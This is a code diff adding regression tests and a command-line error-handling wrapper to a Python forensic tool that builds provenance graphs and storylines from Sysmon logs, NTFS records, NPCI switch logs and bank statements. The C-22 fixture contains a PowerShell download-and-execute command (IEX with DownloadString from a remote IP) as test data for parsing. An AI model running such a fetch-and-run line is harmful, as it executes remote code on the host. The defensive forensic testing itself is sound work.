+    # C-09  evidence altered after triage (ANCHOR_HASH_MISMATCH): D1 OPEN, INTEGRITY_FAILURE, validator fails
+    def c09():
+        if not (a_path and b_path):
+            return False, "Sector A/B modules not found"
+        d = sub("c09")
+        case_dir = os.path.join(d, "case")
+        shutil.copytree(e2e_dir, case_dir)
+        with open(os.path.join(case_dir, os.path.basename(b_path)), "r", encoding="utf-8") as f:
+            tm = json.load(f)
+        lead = next(l for l in tm["symbolic_anchors"] if l["threat_category"] == "REMOTE_ACCESS_SESSION")
+        sa = lead["symbolic_anchor"]
+        img = os.path.join(case_dir, sa["file_path"])
+        with open(img, "r+b") as f:
+            f.seek(sa["byte_offset"])
+            byte = f.read(1)
+            f.seek(sa["byte_offset"])
+            f.write(bytes([byte[0] ^ 0x08]))
+        graph_doc, story = build_from_sector_outputs(
+            os.path.join(case_dir, "sector_a", os.path.basename(a_path)), os.path.join(case_dir, os.path.basename(b_path)),
+            case_dir, os.path.join(d, "out"), case, generated_utc=gen)
+        d1 = next(r for r in story["defense_challenge_matrix"]["rows"] if r["id"] == "D1")
+        errs = validate_storyline(story)
+        rej = [r for r in graph_doc["leads_rejected"] if r["reason"].startswith("ANCHOR_HASH_MISMATCH")]
+        ok = (len(rej) >= 1 and d1["status"] == "OPEN" and lead["lead_id"] in d1.get("evidence", [])
+              and (story.get("integrity_status") or {}).get("status") == "INTEGRITY_FAILURE"
+              and (graph_doc.get("integrity_status") or {}).get("status") == "INTEGRITY_FAILURE"
+              and any("INTEGRITY_FAILURE" in e for e in errs))
+        return ok, (f"refused {[r['lead_id'] for r in rej]}; D1 {d1['status']}; "
+                    f"validate_storyline: {[e[:40] for e in errs]}")
+    run("C-09", "An anchor altered after triage makes D1 OPEN and fails validate_storyline (INTEGRITY_FAILURE)", c09)
+
+    # C-10  --run: tampered / truncated / missing / wrong-type inputs give one line and an exit code, no traceback
+    def c10():
+        if not (a_path and b_path):
+            return False, "Sector A/B modules not found"
+        d = sub("c10")
+        with open(a_path, "r", encoding="utf-8") as f:
+            am = json.load(f)
+        bad_a = dict(am, case_reference=am.get("case_reference"), evidence_id="TAMPERED")
+        pa = os.path.join(d, "tampered_a.json")
+        with open(pa, "w", encoding="utf-8") as f:
+            json.dump(bad_a, f)
+        with open(b_path, "r", encoding="utf-8") as f:
+            btxt = f.read()
+        p_trunc = os.path.join(d, "trunc_b.json")
+        with open(p_trunc, "w", encoding="utf-8") as f:
+            f.write(btxt[:500])
+        p_list = os.path.join(d, "list_b.json")
+        with open(p_list, "w", encoding="utf-8") as f:
+            f.write("[]")
+        p_bind = os.path.join(d, "bindings_obj.json")
+        with open(p_bind, "w", encoding="utf-8") as f:
+            f.write("{}")
+        zero = copy.deepcopy(am)
+        zero.setdefault("bad_sector_manifest", {}).update(sector_size_bytes=0, bad_sectors=[3])
+        if _sector_a is not None and getattr(_sector_a, "_canonical_json", None):
+            body = {k: v for k, v in zero.items() if k != "manifest_canonical_sha256"}
+            zero["manifest_canonical_sha256"] = hashlib.sha256(_sector_a._canonical_json(body)).hexdigest()
+        pz = os.path.join(d, "zero_sector_a.json")
+        with open(pz, "w", encoding="utf-8") as f:
+            json.dump(zero, f)
+        runs = {"tampered A manifest": (["--evidence-manifest", pa, "--triage-manifest", b_path], 2),
+                "truncated triage": (["--triage-manifest", p_trunc], 4),
+                "missing triage": (["--triage-manifest", os.path.join(d, "nope.json")], 3),
+                "triage is a list": (["--triage-manifest", p_list], 4),
+                "bindings object": (["--evidence-manifest", a_path, "--triage-manifest", b_path,
+                                     "--case-bindings", p_bind], 4),
+                "sector size 0": (["--evidence-manifest", pz, "--triage-manifest", b_path], 4)}
+        res = []
+        so, se = sys.stdout, sys.stderr
+        for label, (args, want) in runs.items():
+            err = io.StringIO()
+            sys.stdout, sys.stderr = io.StringIO(), err
+            try:
+                rc = _main(["--run", *args, "--evidence-root", e2e_dir, "--out", os.path.join(d, "out"),
+                            "--case-id", case])
+            except BaseException as exc:      # a traceback / SystemExit is the failure being tested
+                rc = f"{type(exc).__name__}"
+            finally:
+                sys.stdout, sys.stderr = so, se
+            line = err.getvalue().strip().splitlines()
+            res.append((rc == want and len(line) == 1 and line[0].startswith("SECTOR_C: "),
+                        f"{label}: rc {rc}" + (f" {line[0][:34]}" if line else "")))
+        return all(o for o, _d in res), "; ".join(dd for _o, dd in res)
+    run("C-10", "--run turns bad inputs into one SECTOR_C: line and exit 2/3/4, never a traceback", c10)
+
+    # C-11  two evidence files with the same base name keep separate Section 63 names and both re-verify
+    def c11():
+        d = sub("c11")
+        paths = []
+        for host, pid in (("hostA", 1), ("hostB", 22)):
+            os.makedirs(os.path.join(d, host))
+            paths.append(write_text(os.path.join(d, host, "sysmon.jsonl"), [
+                sysmon(8, SourceImage=f"C:\\x\\evil{pid}.exe", SourceProcessId=pid,
+                       TargetImage="C:\\Windows\\System32\\lsass.exe", TargetProcessId=700)]))
+        g = graph(d)
+        for p in paths:
+            g.ingest_sysmon_jsonl(p)
+        s = g.export_storyline(gen, write=False)
+        names = sorted({st["provenance"]["source_file"] for st in s["steps"]})
+        ver = [p.get("anchor_reverified") for p in _all_anchors(s["steps"])]
+        ok = (len(s["steps"]) == 2 and len(names) == 2 and all(v is True for v in ver)
+              and not any("not re-verified" in e for e in validate_storyline(s)))
+        return ok, f"names {names}; re-verified {ver}"
+    run("C-11", "Two files named sysmon.jsonl from two hosts get distinct source names and both re-verify", c11)
+
+    # C-12  anchors and case-binding documents outside the evidence root are refused
+    def c12():
+        d = sub("c12")
+        root = os.path.join(d, "root")
+        os.makedirs(root)
+        secret = b"outside the evidence root\n"
+        out_p = write_bytes(os.path.join(d, "outside_secret.txt"), secret)
+        write_bytes(os.path.join(root, "inside.txt"), secret)
+        anc = {"source_file": "../outside_secret.txt", "byte_offset": 0, "length": len(secret),
+               "sha256": hashlib.sha256(secret).hexdigest(), "source_type": "TEST"}
+        g = graph(root)
+        e_rel = caught(lambda: g.add_edge(("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, anc))
+        e_abs = caught(lambda: g.add_edge(("PROCESS", "a"), ("PROCESS", "c"), REL_SPAWNED, T,
+                                          dict(anc, source_file=os.path.abspath(out_p))))
+        e_in = caught(lambda: g.add_edge(("PROCESS", "a"), ("PROCESS", "d"), REL_SPAWNED, T,
+                                         dict(anc, source_file="inside.txt")))
+        bind = os.path.join(root, "bindings.json")
+        with open(bind, "w", encoding="utf-8") as f:
+            json.dump([{"src": ["UPI_ACCOUNT", "x@ybl"], "dst": ["IDENTITY", "y"], "relation": "OWNS",
+                        "document": os.path.abspath(out_p), "quote": "outside the evidence root"}], f)
+        cb = g.ingest_case_bindings(bind)
+        ok = (e_rel.startswith("ProvenanceError: OUTSIDE_EVIDENCE_ROOT") and e_abs.startswith("ProvenanceError")
+              and e_in == "ok" and cb["bindings_added"] == 0 and len(cb["bindings_refused"]) == 1)
+        return ok, f"'../' anchor: {e_rel[:45]}; absolute: {e_abs[:45]}; inside: {e_in}; binding {cb}"[:300]
+    run("C-12", "Anchors / case-binding documents outside the evidence root are refused (no '../' or CWD escape)", c12)
+
+    # C-13  the validators fail malformed documents with a message and never raise
+    def c13():
+        s0, g0 = ctx.get("story"), ctx.get("graph_doc")
+        if not (isinstance(s0, dict) and s0.get("steps") and isinstance(g0, dict)):
+            return False, "self-test storyline not available"
+        muts = {"step without relation": lambda s: s["steps"][0].pop("relation"),
+                "step without actor": lambda s: s["steps"][0].pop("actor"),
+                "step provenance null": lambda s: s["steps"][0].__setitem__("provenance", None),
+                "binding without provenance": lambda s: s["identity_bindings"].append({}),
+                "audit entry is a string": lambda s: s["audit_ledger"].append("x"),
+                "sector_a_binding is a string": lambda s: s.__setitem__("sector_a_binding", "x"),
+                "NaN value": lambda s: s["steps"][0].__setitem__("x", float("nan")),
+                "steps is null": lambda s: s.__setitem__("steps", None)}
+        res = []
+        for label, mut in muts.items():
+            s = copy.deepcopy(s0)
+            mut(s)
+            r = caught(lambda: validate_storyline(s))
+            errs = validate_storyline(s) if r == "ok" else []
+            res.append((r == "ok" and bool(errs), f"{label}: {r if r != 'ok' else len(errs)}"))
+        for label, mut in {"graph node is a string": lambda x: x["nodes"].append("n"),
+                           "graph nodes is null": lambda x: x.__setitem__("nodes", None),
+                           "graph edge is a list": lambda x: x["edges"].append([1])}.items():
+            x = copy.deepcopy(g0)
+            mut(x)
+            r = caught(lambda: validate_attack_graph(x))
+            errs = validate_attack_graph(x) if r == "ok" else []
+            res.append((r == "ok" and bool(errs), f"{label}: {r if r != 'ok' else len(errs)}"))
+        top = caught(lambda: validate_storyline([]))
+        res.append((top == "ok" and bool(validate_storyline([])), f"top-level list: {top}"))
+        return all(o for o, _d in res), "; ".join(dd for o, dd in res if not o) or f"{len(res)} malformed documents failed cleanly"
+    run("C-13", "validate_storyline / validate_attack_graph return errors for malformed documents, never raise", c13)
+
+    # C-14  default capacity / export size fit the 422 MB pipeline budget (measured per edge, projected)
+    def c14():
+        cap = inspect.signature(TemporalProvenanceGraph.__init__).parameters["capacity"].default
+        mx = inspect.signature(TemporalProvenanceGraph.export_attack_graph).parameters["max_edges"].default
+        n = 1500
+        g = TemporalProvenanceGraph(case, capacity=n + 8, output_dir=odir, verify_anchors=False)
+        for i in range(n):
+            g.add_edge(("PROCESS", f"p{i % 50}"), ("SOCKET", f"10.0.{(i // 250) % 240}.{i % 250}:{1000 + i}"),
+                       REL_CONNECTED_TO, T + i * 1000, {"source_file": "big.pcap", "byte_offset": 24 + i * 70,
+                                                         "length": 70, "sha256": "%064x" % i,
+                                                         "source_type": "PCAP_PACKET_RECORD"}, 0.3 + (i % 7) / 10)
+        peaks = []
+        for fn in (lambda: g.export_attack_graph(gen, write=False), lambda: g.export_storyline(gen, write=False)):
+            gc.collect()
+            tracemalloc.start()
+            fn()
+            peaks.append(tracemalloc.get_traced_memory()[1] / n)
+            tracemalloc.stop()
+        g.close()
+        budget = 422 * 1024 * 1024
+        exp_proj, sol_proj = peaks[0] * mx, peaks[1] * cap
+        ok = exp_proj < budget / 2 and sol_proj < budget / 2
+        return ok, (f"export {peaks[0]:.0f} B/edge x {mx:,} = {exp_proj / 2**20:.0f} MiB; solver {peaks[1]:.0f} B/edge x "
+                    f"{cap:,} = {sol_proj / 2**20:.0f} MiB (half budget {budget / 2 / 2**20:.0f} MiB)")
+    run("C-14", "Default ring capacity and export size keep the solver and the export inside the memory budget", c14)
+
+    # C-15  $MFT ingest: bounded working set and compact retained state per record
+    def c15():
+        d = sub("c15")
+        n = 12_000
+        img = bytearray(n * 1024)
+        for i in range(n):
+            img[i * 1024:(i + 1) * 1024] = build_mft_record(i + 16, f"f{i}.txt", 5, [good_ft] * 4, [good_ft] * 4,
+                                                            0x100 + i, 0x10)
+        p = write_bytes(os.path.join(d, "mft.img"), bytes(img))
+        del img
+        g = graph(d, capacity=64, verify_anchors=False)
+        gc.collect()
+        tracemalloc.start()
+        r = g.ingest_ntfs(p, 0, n * 1024)
+        cur, peak = tracemalloc.get_traced_memory()
+        tracemalloc.stop()
+        return (r["records"] == n and peak / n < 2000 and cur / n < 800), \
+            f"{n:,} records: peak {peak / n:.0f} B/record, retained {cur / n:.0f} B/record"
+    run("C-15", "$MFT ingest is streamed: peak under 2 KB and retained state under 0.8 KB per record", c15)
+
+    # C-16  NPCI switch log: memory per line bounded and hub detection not quadratic in a payer's legs
+    def c16():
+        d = sub("c16")
+
+        def log(n: int) -> str:
+            lines = [f"{ns_to_iso(T + i * NS)[:23]}Z RRN={628711000000 + i} PAYER=agg@ybl PAYEE=m{i % 2}@ybl "
+                     f"AMT=10.00 RESP=00" for i in range(n)]
+            return write_text(os.path.join(d, f"npci_{n}.log"), lines)
+
+        p_small, p_big, p_mem = log(1000), log(8000), log(3000)
+
+        def timed(p: str) -> float:
+            g = graph(d, capacity=64, verify_anchors=False)
+            t0 = time.perf_counter()
+            g.ingest_npci_switch_log(p)
+            return time.perf_counter() - t0
+
+        t_small = min(timed(p_small), timed(p_small))
+        t_big = timed(p_big)
+        g = graph(d, capacity=64, verify_anchors=False)
+        gc.collect()
+        tracemalloc.start()
+        g.ingest_npci_switch_log(p_mem)
+        peak = tracemalloc.get_traced_memory()[1] / 3000
+        tracemalloc.stop()
+        ratio = t_big / max(t_small, 1e-6)
+        return ratio < 20 and peak < 700, (f"8x the legs took {ratio:.1f}x the time ({t_small:.2f} s -> {t_big:.2f} s; "
+                                           f"quadratic is ~64x); peak {peak:.0f} B/line")
+    run("C-16", "NPCI hub detection is a sliding window (not quadratic) and keeps no per-line dicts", c16)
+
+    # C-17  repairing an inverted SPAWNED edge moves the child's birth; the child's earlier actions are repaired too
+    def c17():
+        g = TemporalProvenanceGraph(case, capacity=64, output_dir=odir, verify_anchors=False)
+        g.add_edge(("PROCESS", "explorer.exe#1"), ("PROCESS", "loader.exe#7"), REL_SPAWNED, T, _fake_anchor(1), 0.9)
+        g.add_edge(("PROCESS", "loader.exe#7"), ("PROCESS", "stage2.exe#8"), REL_SPAWNED, T - 3600 * NS,
+                   _fake_anchor(2), 0.9)
+        g.add_edge(("PROCESS", "stage2.exe#8"), ("SOCKET", "203.0.113.9:443"), REL_CONNECTED_TO, T - 1800 * NS,
+                   _fake_anchor(3), 0.9)
+        cr = g.check_causality()
+        s = g.export_storyline(gen, write=False)
+        d2 = next(r for r in s["defense_challenge_matrix"]["rows"] if r["id"] == "D2")
+        born = g.created_ts[g.entities.lookup("PROCESS", "stage2.exe#8")]
+        ok = (cr["unresolved"] == 0 and s["causality"]["storyline_inversions"] == 0 and born >= T
+              and d2["status"] == "REBUTTED" and not any("causality" in e for e in validate_storyline(s, require_reverified=False)))
+        return ok, (f"repaired {cr['repaired']}, unresolved {cr['unresolved']}; stage2 born {ns_to_iso(born)}; "
+                    f"storyline inversions {s['causality']['storyline_inversions']}; D2 {d2['status']}")
+    run("C-17", "A repaired SPAWNED edge re-dates the child, so its own actions are re-checked (no inversion left)", c17)
+
+    # C-18  anchor length >= 2^32 / offset >= 2^63: refused before anything is stored
+    def c18():
+        g = TemporalProvenanceGraph(case, capacity=4, output_dir=odir, verify_anchors=False)
+        good = {"source_file": "a.bin", "byte_offset": 0, "length": 10, "sha256": "11" * 32, "source_type": "T"}
+        g.add_edge(("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, good, 0.9)
+        e1 = caught(lambda: g.add_edge(("PROCESS", "c"), ("PROCESS", "d"), REL_SPAWNED, T + 1,
+                                       dict(good, source_file="huge.bin", byte_offset=100, length=2 ** 32 + 5), 0.9))
+        e2 = caught(lambda: g.add_edge(("PROCESS", "e"), ("PROCESS", "f"), REL_SPAWNED, T + 2,
+                                       dict(good, byte_offset=2 ** 64), 0.9))
+        ok = (e1 == "ProvenanceError: ANCHOR_OUT_OF_RANGE" and e2 == "ProvenanceError: ANCHOR_OUT_OF_RANGE"
+              and g.arena.count == 1 and g.rejected_count.get("ANCHOR_OUT_OF_RANGE") == 2)
+        return ok, f"length 2^32+5: {e1}; offset 2^64: {e2}; edges stored {g.arena.count}"
+    run("C-18", "An anchor whose length/offset the ledger cannot hold is refused; no edge keeps a stale anchor", c18)
+
+    # C-19  UTF-16 exports (Windows PowerShell 5.1 Out-File) are read with exact byte anchors
+    def c19():
+        d = sub("c19")
+        two = [inject, sysmon(8, SourceImage="C:\\x\\b.exe", SourceProcessId=3,
+                              TargetImage="C:\\Windows\\System32\\lsass.exe", TargetProcessId=2)]
+        p = os.path.join(d, "sysmon16.jsonl")
+        with open(p, "w", encoding="utf-16", newline="\r\n") as f:
+            f.write("\n".join(two) + "\n")
+        g = graph(d)
+        n = g.ingest_sysmon_jsonl(p)
+        s = g.export_storyline(gen, write=False)
+        ver = [x.get("anchor_reverified") for x in _all_anchors(s["steps"])]
+        hub = ["2026-10-14T06:15:20.000Z RRN=1 PAYER=hub@ybl PAYEE=m1@ybl AMT=1.00 RESP=00",
+               "2026-10-14T06:15:21.000Z RRN=2 PAYER=hub@ybl PAYEE=m2@ybl AMT=1.00 RESP=00"]
+        p2 = os.path.join(d, "npci16.log")
+        with open(p2, "w", encoding="utf-16-le", newline="\n") as f:
+            f.write("\ufeff" + "\n".join(hub) + "\n")
+        g2 = graph(d)
+        n2 = g2.ingest_npci_switch_log(p2)
+        ok = n == 2 and not g.rejected_count and len(ver) == 2 and all(v is True for v in ver) and n2 == 2
+        return ok, f"Sysmon UTF-16: {n} edges, rejected {dict(g.rejected_count)}, re-verified {ver}; NPCI UTF-16: {n2} legs"
+    run("C-19", "UTF-16 (BOM) Sysmon and NPCI exports are parsed, with anchors that re-hash", c19)
+
+    # C-20  --run with stdout redirected through a non-UTF-8 code page and a Devanagari output folder
+    def c20():
+        if not (a_path and b_path):
+            return False, "Sector A/B modules not found"
+        d = sub("c20")
+        out_dir = os.path.join(d, "out_\u0938\u093e\u0915\u094d\u0937\u094d\u092f")
+        so, se = sys.stdout, sys.stderr
+        buf_o, buf_e = io.BytesIO(), io.BytesIO()
+        w_o, w_e = io.TextIOWrapper(buf_o, encoding="cp1252"), io.TextIOWrapper(buf_e, encoding="cp1252")
+        sys.stdout, sys.stderr = w_o, w_e      # a Windows console / redirected file without PYTHONUTF8
+        try:
+            rc = _main(["--run", "--evidence-manifest", a_path, "--triage-manifest", b_path, "--evidence-root",
+                        e2e_dir, "--out", out_dir, "--case-id", case])
+        except BaseException as exc:
+            rc = f"{type(exc).__name__}: {exc}"[:80]
+        finally:
+            sys.stdout, sys.stderr = so, se
+            for w in (w_o, w_e):
+                try:
+                    w.flush()
+                except Exception:      # the unencodable text is still in the wrapper's buffer (unfixed code)
+                    pass
+        text = buf_o.getvalue().decode("cp1252", "replace")
+        w_o.detach()
+        w_e.detach()
+        ok = rc == 0 and os.path.isfile(os.path.join(out_dir, STORYLINE_FILENAME)) and "\\u0938" in text
+        return ok, f"rc {rc}; printed path {text.strip().splitlines()[-1][-40:] if text.strip() else '(none)'}"
+    run("C-20", "--run prints a non-cp1252 output path escaped (exit 0), not UnicodeEncodeError", c20)
+
+    # C-21  Excel "CSV UTF-8" (BOM) bank statement keeps txn_id
+    def c21():
+        d = sub("c21")
+        p = os.path.join(d, "bank.csv")
+        with open(p, "w", encoding="utf-8-sig", newline="\r\n") as f:
+            f.write("txn_id,timestamp_utc,holder_mobile,payer_vpa,payee_vpa,amount_inr,channel\n"
+                    "B2,2026-10-14T06:15:00.000Z,+919900000077,rahul@okhdfc,hub.kyc@ybl,250000.00,NETBANKING\n")
+        g = graph(d)
+        g.ingest_bank_statement_csv(p)
+        doc = g.export_attack_graph(gen, write=False)
+        txns = [e.get("txn_id") for e in doc["edges"] if e["relation"] == "UPI_TRANSFER"]
+        return txns == ["B2"], f"UPI_TRANSFER txn_id {txns}"
+    run("C-21", "A bank CSV saved with a UTF-8 BOM keeps txn_id on its edges", c21)
+
+    # C-22 / C-LNK01: LOLBin URL ports by scheme; RESOLVES_TO edges keep the calling lead's id
+    lol_anchor = _fake_anchor(9, "lol.bin")
+    lol_lead = {"lead_id": "LEAD-LOL-1", "threat_category": "LOLBINS_COMMAND", "threat_score": 0.9,
+                "symbolic_anchor": dict(lol_anchor, source_type="SYSMON_EVENT_LOG_JSONL"),
+                "lead_details": {"parent_image": "cmd.exe", "image": "powershell.exe", "timestamp_utc": "2026-10-14T06:10:10Z",
+                                 "deobfuscation_layers": [{"text": "IEX (New-Object Net.WebClient).DownloadString("
+                                                                   "'https://185.220.101.5/p.ps1'); iwr ftp://203.0.113.9/x.bin"}]}}
+
+    def lol_graph() -> TemporalProvenanceGraph:
+        g = TemporalProvenanceGraph(case, capacity=64, output_dir=odir, verify_anchors=False)
+        g._lead_to_edges(copy.deepcopy(lol_lead), {})
+        return g
+
+    def c22():
+        g = lol_graph()
+        socks = sorted(g.entities.names[v] for v in range(len(g.entities)) if g.entities.kinds[v] == "SOCKET")
+        return socks == ["185.220.101.5:443", "203.0.113.9:21"], f"sockets {socks}"
+    run("C-22", "LOLBin URL sockets default the port by scheme (https 443, ftp 21), not always 80", c22)
+
+    def c_lnk01():
+        g = lol_graph()
+        res = [g.edge(q) for q, r in g.arena.iter_edges() if r[2] == REL_RESOLVES_TO]
+        ids = [e["meta"].get("lead_id") for e in res]
+        e2e_res = [e for e in (e2e_graph or {}).get("edges", []) if e.get("relation") == "RESOLVES_TO"]
+        e2e_ids = [e.get("lead_id") for e in e2e_res]
+        bad_src = [b.get("timestamp_source") for b in (e2e_story or {}).get("identity_bindings", [])
+                   if b.get("relation") == "RESOLVES_TO" and b.get("timestamp_source") == "VIDEO_CALL_ROI_TRACE"]
+        ok = (len(ids) == 2 and all(i == "LEAD-LOL-1" for i in ids) and e2e_res and all(e2e_ids) and not bad_src)
+        return ok, f"synthetic RESOLVES_TO lead_id {ids}; Sector B case {len(e2e_res)} RESOLVES_TO, lead_id {e2e_ids}"
+    run("C-LNK01", "RESOLVES_TO binding edges carry the calling lead's id and time source", c_lnk01)
+
+    # C-D1-01  D1 claims integrity since acquisition only, and discloses Sector A's custody status
+    def c_d1():
+        if not isinstance(e2e_story, dict):
+            return False, "Sector A/B modules not found"
+        d1 = next(r for r in e2e_story["defense_challenge_matrix"]["rows"] if r["id"] == "D1")
+        st = (e2e_story.get("sector_a_binding") or {}).get("admissibility_status")
+        ok = ("seizure" not in d1["challenge"].split("(")[0] and "acquisition" in d1["challenge"]
+              and (st in (None, "READY_FOR_COURT") or str(st) in d1["basis"]))
+        return ok, f"D1 '{d1['challenge']}' {d1['status']}; Sector A {st}; basis names it: {str(st) in d1['basis']}"
+    run("C-D1-01", "D1 does not claim 'not altered after seizure'; a Sector A custody block is named in its basis", c_d1)
+
+    # C-ORD01  same time and byte offset: the creation step comes before the created process's own action
+    def c_ord():
+        wrong = []
+        for k in range(8):
+            g = TemporalProvenanceGraph(case, capacity=16, output_dir=odir, verify_anchors=False)
+            a = _fake_anchor(k, "events.jsonl")
+            child = f"certutil.exe#{100 + k}"
+            g.add_edge(("PROCESS", "cmd.exe#1"), ("PROCESS", child), REL_SPAWNED, T, a, 0.9)
+            g.add_edge(("PROCESS", child), ("SOCKET", "185.220.101.5:80"), REL_CONNECTED_TO, T, a, 0.9)
+            rels = [s["relation"] for s in g.export_storyline(gen, write=False)["steps"]]
+            if rels != ["SPAWNED", "CONNECTED_TO"]:
+                wrong.append((k, rels))
+        e2e_wrong = []
+        steps = (e2e_story or {}).get("steps", [])
+        for i, s in enumerate(steps):
+            for t in steps[i + 1:]:
+                if (t["relation"] == "SPAWNED" and t["target"] == s["actor"] and t.get("timestamp_ns") == s.get("timestamp_ns")
+                        and t["provenance"]["byte_offset"] == s["provenance"]["byte_offset"]):
+                    e2e_wrong.append((s["step"], t["step"]))
+        return not wrong and not e2e_wrong, f"synthetic pairs out of order {wrong}; Sector B case {e2e_wrong}"
+    run("C-ORD01", "Steps from one record list the spawn before the spawned process's action", c_ord)
+
+    return out
+
+
 def _self_test(workdir: str) -> int:
     import tracemalloc
     os.makedirs(workdir, exist_ok=True)
@@ -4028,6 +5506,9 @@ def _self_test(workdir: str) -> int:
         "cdir": cdir, "exp": exp, "story": story, "a_exe_meta": a_exe_meta,
         "e2e_story": e2e_story if ge else None, "case_bindings": case_bind if ge else None,
         "bad_bindings": bad_bind if ge else None})
+    overnight = _overnight_regressions(workdir, case, gen, {
+        "cdir": cdir, "exp": exp, "story": story, "graph_doc": graph_doc, "e2e_dir": e2e_dir, "a_path": a_path,
+        "b_path": b_path, "e2e_graph": e2e_graph if ge else None, "e2e_story": e2e_story if ge else None})
 
     print("\nChecks")
     for n in sorted(results):
@@ -4035,6 +5516,9 @@ def _self_test(workdir: str) -> int:
         print(f"  [{'PASS' if ok else 'FAIL'}] {n:02d} {name}" + (f"  ({detail})" if detail else ""))
     print("\nAudit regression checks (hostile audit of r1)")
     for rid, name, ok, detail in regs:
+        print(f"  [{'PASS' if ok else 'FAIL'}] {rid} {name}" + (f"  ({detail})" if detail else ""))
+    print("\nOvernight audit regression checks (findings C-01..C-22, C-D1-01, C-ORD01, C-LNK01)")
+    for rid, name, ok, detail in overnight:
         print(f"  [{'PASS' if ok else 'FAIL'}] {rid} {name}" + (f"  ({detail})" if detail else ""))
     print("\nDigital Arrest storyline")
     for s in steps:
@@ -4046,11 +5530,59 @@ def _self_test(workdir: str) -> int:
     passed = sum(1 for _, ok, _ in results.values() if ok)
     rpassed = sum(1 for _r, _n, ok, _d in regs if ok)
     print(f"\n{passed}/{len(results)} checks passed")
+    opassed = sum(1 for _r, _n, ok, _d in overnight if ok)
     print(f"{rpassed}/{len(regs)} audit regression checks passed")
-    return 0 if passed == len(results) and rpassed == len(regs) else 1
+    print(f"{opassed}/{len(overnight)} overnight audit regression checks passed")
+    return 0 if passed == len(results) and rpassed == len(regs) and opassed == len(overnight) else 1
+
+
+def _safe_console() -> None:
+    """
+    A Windows console, or output redirected to a file, uses the ANSI code page (cp1252, cp437, ...): a
+    Devanagari folder name or a non-Latin process name must not turn into a UnicodeEncodeError (and a
+    failing exit code) after the outputs were written. Unencodable characters are escaped instead.
+    """
+    for stream in (sys.stdout, sys.stderr):
+        enc = (getattr(stream, "encoding", None) or "").lower().replace("-", "").replace("_", "")
+        if enc in ("utf8", "utf8sig") or not hasattr(stream, "reconfigure"):
+            continue
+        try:
+            stream.reconfigure(errors="backslashreplace")
+        except (ValueError, OSError, AttributeError, TypeError):    # a stream that cannot be reconfigured
+            pass
+
+
+# Exit codes of --run when an input cannot be used (a .bat can test errorlevel): 2 integrity tripwire,
+# 3 input unreadable, 4 input malformed. The one-line reason goes to stderr; no traceback, no outputs.
+EXIT_INTEGRITY_FAILURE, EXIT_UNREADABLE, EXIT_MALFORMED_INPUT = 2, 3, 4
+
+
+def _run_cli(args: Any) -> int:
+    try:
+        graph, story = build_from_sector_outputs(args.evidence_manifest, args.triage_manifest, args.evidence_root,
+                                                 args.out, args.case_id, case_bindings=args.case_bindings)
+    except IntegrityError as exc:
+        print(f"SECTOR_C: INTEGRITY_FAILURE: {exc}", file=sys.stderr)
+        return EXIT_INTEGRITY_FAILURE
+    except OSError as exc:
+        print(f"SECTOR_C: UNREADABLE: {exc}", file=sys.stderr)
+        return EXIT_UNREADABLE
+    except _MALFORMED_ERRORS as exc:     # JSONDecodeError, wrong JSON types, MANIFEST_MALFORMED, ...
+        print(f"SECTOR_C: MALFORMED_INPUT: {type(exc).__name__}: {exc}"[:2000], file=sys.stderr)
+        return EXIT_MALFORMED_INPUT
+    print(f"{len(graph['edges'])} edges, {len(story['steps'])} storyline steps; "
+          f"verdict {story['defense_challenge_matrix']['verdict']}")
+    integ = story.get("integrity_status") or {}
+    if integ.get("status") not in (None, "OK"):
+        print(f"SECTOR_C: INTEGRITY_FAILURE: {integ.get('anchor_hash_mismatches')} anchor(s) no longer match the "
+              f"evidence (refused leads: {', '.join(integ.get('leads') or []) or 'none'})", file=sys.stderr)
+    print(os.path.join(args.out, ATTACK_GRAPH_FILENAME))
+    print(os.path.join(args.out, STORYLINE_FILENAME))
+    return EXIT_INTEGRITY_FAILURE if integ.get("status") not in (None, "OK") else 0
 
 
 def _main(argv: Sequence[str]) -> int:
+    _safe_console()
     if argv and argv[0] == "--run":
         import argparse
         ap = argparse.ArgumentParser(prog="sector_c_graph.py --run")
@@ -4061,13 +5593,7 @@ def _main(argv: Sequence[str]) -> int:
         ap.add_argument("--case-id")
         ap.add_argument("--case-bindings", help="JSON list of document-quoted attribution links")
         args = ap.parse_args(argv[1:])
-        graph, story = build_from_sector_outputs(args.evidence_manifest, args.triage_manifest, args.evidence_root,
-                                                 args.out, args.case_id, case_bindings=args.case_bindings)
-        print(f"{len(graph['edges'])} edges, {len(story['steps'])} storyline steps; "
-              f"verdict {story['defense_challenge_matrix']['verdict']}")
-        print(os.path.join(args.out, ATTACK_GRAPH_FILENAME))
-        print(os.path.join(args.out, STORYLINE_FILENAME))
-        return 0
+        return _run_cli(args)
     return _self_test(argv[0] if argv else os.path.join(os.getcwd(), "sutra_graph_selftest"))
 
 
